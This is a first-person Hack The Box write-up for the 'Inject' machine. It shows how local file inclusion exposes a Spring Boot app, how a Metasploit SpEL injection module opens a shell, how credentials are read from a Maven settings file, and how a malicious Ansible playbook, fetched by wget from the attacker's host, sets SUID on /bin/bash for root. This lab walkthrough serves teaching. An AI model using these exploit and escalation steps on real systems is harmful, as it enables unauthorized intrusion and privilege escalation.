# Inject - HTB
### Difficulty level: Easy
------------------------------------------------------

I'll start with nmap scan:
```bash
nmap -sV -sC 10.10.11.204 | tee nmap/first_scan
```

Results:
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

This is a linux machine, there are 2 open services - web app on 8080 and ssh on 22.

I'll start with the web app service on port 8080 by testing its directories:
```bash
gobuster dir -u http://10.10.11.204:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster/dir_scan
```

Results:
```bash
/register             (Status: 200) [Size: 5654]
/blogs                (Status: 200) [Size: 5371]
/upload               (Status: 200) [Size: 1857]
/environment          (Status: 500) [Size: 712]
/error                (Status: 500) [Size: 106]
/release_notes        (Status: 200) [Size: 1086]
```

The most interesting is "/upload" directory, let's open it:

![image](https://user-images.githubusercontent.com/114166939/233862706-dbd2a3ce-0356-4cb9-b0c2-990778ce6a91.png)

I'll make an empty PNG file (so it won't take much time to upload it) with the command:
```bash
touch empty.png
```
Also, I'll power-up Foxy-Proxy tool:

![image](https://user-images.githubusercontent.com/114166939/233863036-986a4feb-828f-4ebf-a77f-57eb4a614e9b.png)

And open interception on Burp-Suite to examine the request:

![image](https://user-images.githubusercontent.com/114166939/233863114-5ca16b2a-c330-4719-bf61-3ae0a0fac1d4.png)

Click on upload:

![image](https://user-images.githubusercontent.com/114166939/233863161-33199fc6-50c1-40b9-a454-2f9e376e89b5.png)

Caught the request! Now I'll send it to the repeater with ctrl + R,

Because the image is empty added some strings,

Click on send and the image uploaded:

![image](https://user-images.githubusercontent.com/114166939/233863419-2691fb6b-2bf0-4a95-832c-14830aaf7678.png)


On the response there is the html code:
```html
<a class="text-success" href="/show_image?img=empty.png">View your Image</a>
```

So if I want to view my image I need to approach this path "/show_image?img=empty.png", 

Than I'll open "Proxy" again and I'll intercept a home request of the site:

![image](https://user-images.githubusercontent.com/114166939/233961590-72eebbb2-722e-48d7-b770-d684bd907023.png)

I got the request, hit: ctrl + R, to send to the "Repeater".
I'll try to get the "/show_image?img=empty.png" by adding it to the header:

Hit the send button and got "HTTP Status 500 – Internal Server Error":

![image](https://user-images.githubusercontent.com/114166939/233962647-8185e340-a03e-409b-a304-4cdf08160bfe.png)

Probably the it cand display an empty image, I'll give it another value to check for LFI,
Let's add "../" to the request instead the "empty.png":

![image](https://user-images.githubusercontent.com/114166939/233963489-7319a620-1e3d-4c87-b1bb-0dff6f356275.png)

Got the answer from the server, it is vulnerable to LFI!
The server tell us it have the "java & resources & uploads" directories in the current location.

Let's manipulate the server to search for more information about itself and about its users.

There is a realy important file here which can help us to gain access to the system:
"HELP.md" file located on "../../../HELP.md" which reveals that this web use "Spring-Boot" which has many vulnerabilities.

![image](https://user-images.githubusercontent.com/114166939/233965718-a9f64dde-34de-4f4f-bbd8-9ea332848818.png)

Let's open "Metasploit" tool:
```bash
msfconsole -q
```

I'll search for "spring-boot" payloads:
```bash
search spring
```

Found these payloads:

![image](https://user-images.githubusercontent.com/114166939/233968106-ae0d2624-2f24-4961-a284-191effbdd3d0.png)

I'll use the "exploit/multi/http/spring_cloud_function_spel_injection" payload.

![image](https://user-images.githubusercontent.com/114166939/233968561-de5293b2-7e67-42b6-8ef4-54682b94d1d4.png)

```bash
use exploit/multi/http/spring_cloud_function_spel_injection
```

Alright! let's see what options I need to configure:
```bash
show options
```
The main options I require to set are - "RHOSTS & RPORT & LHOST",
I'll set them with the commands:
```bash
set RHOSTS 10.10.11.204
set RPORT 8080
set LHOST tun0
run
```
We got a meterpreter!

The current user is "frank":

![image](https://user-images.githubusercontent.com/114166939/233970537-b34017e1-2059-415d-a2be-3b16e8cb2bd1.png)


In it's home directory in hidden directory called ".m2", I found a configuration file which contains a credentials of a user called "phil":
```bash
cd .m2
cat settings.xml
```

![image](https://user-images.githubusercontent.com/114166939/233971734-d8e8d102-8471-4ecb-9a08-bb6b61658d60.png)

Only "phil" user can open the "user.txt" file which located on its home directory,
I'll switch to this user with the credentials I just found, 
But first, I'll replace to regular shell from the meterpreter and than switch the user to "phil":

![image](https://user-images.githubusercontent.com/114166939/233973819-81bd1c5b-02d5-49ac-a47a-3b3f4e192d47.png)

To upgrade the "sh" to "bash" I'll run the python command:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

![image](https://user-images.githubusercontent.com/114166939/233974548-b5de0e36-ded9-40d9-81e9-5939a29501fa.png)

Now let's get the first flag:

![image](https://user-images.githubusercontent.com/114166939/233975514-63937736-7723-4a76-9a4c-84dd8b272d50.png)

Let's invesigate this user -
It's not in the sudoers so it can't run sudo commands

![image](https://user-images.githubusercontent.com/114166939/233976679-599040ae-a35e-4672-8ee5-e597d813d52b.png)

He does belongs to the "staff" group, which is not default and he is the only member in it:

![image](https://user-images.githubusercontent.com/114166939/233977220-a3dbba50-760c-4f41-9371-ceb3744b6666.png)

Let's check what files or directories owned by this group:
```bash
find / -group staff 2>/dev/null
```
This search reveals many results:

![image](https://user-images.githubusercontent.com/114166939/233978100-22f2531c-7431-4cf9-b4b7-9482a3e41b67.png)

There is one word which is repetitive, "ansible" which refers to infrastructure of environment, virtualized hosts and hypervisors.

Let's open the first directory - "/opt/automation/tasks":

![image](https://user-images.githubusercontent.com/114166939/233979248-84fcd3f8-54ae-4d76-993f-d9ddb1d6d3d7.png)

It contains the "playbook_1.yml", quick search on google will lead us to find out that playbook is one of the core features of Ansible and tell Ansible what to execute,
it is like a "to-do" list for ansible.

As "phil" user I can't edit this file, but what I can do, is to add a playbook to this directory because this directory owned by "staff" group.

Which means I can force the system to execute a command with root priveleges!

I'll open a new file on my machine, I'll call it "playbook_2.yml":
```bash
nano playbook_2.yml
```

Now the command I want the system to run as root is:
```bash
chmod u+s /bin/bash
```
To exploit the SUID vulnerability and gain privilege escalation.

So I'll write into "playbook_2.yml" the following code:
```bash
- name: playbook2
  hosts: localhost
  become: yes
  tasks:
    - name: Privilege escalation please ;)
      become: yes
      file:
        path: /bin/bash
        mode: u+s
```

To transfer it to the victim machine I'll open a python3 server on the attacker machine:
```bash
python3 -m http.server
```

On the victim machine I'll use "wget" to download the file:
```bash
wget http://10.10.14.85:8000/playbook_2.yml
```
Got the file!

![image](https://user-images.githubusercontent.com/114166939/233982989-9597389d-d22d-4518-9696-a01eae0baa45.png)

Let's run the playbooks with the command:
```bash
ansible
```

Now let's check if it worked:
```bash
ls -la /bin/bash
```

![image](https://user-images.githubusercontent.com/114166939/233983300-88d3d9ca-5871-42ee-a2d1-c51df2911c3d.png)

Got the 's' in the permissions!
All left to do is to exploit the SUID vulnerability which can be found in "https://gtfobins.github.io/gtfobins/bash/" under the "SUID" title:

```bash
/bin/bash -p
```

![image](https://user-images.githubusercontent.com/114166939/233984055-b0c2ef2f-2bd5-476f-a407-dde9c78bbb27.png)

And now I can print the "root.txt" which located in the "/root" directory:

![image](https://user-images.githubusercontent.com/114166939/233984425-323b7975-ede4-4898-97d2-697aa5004dfa.png)
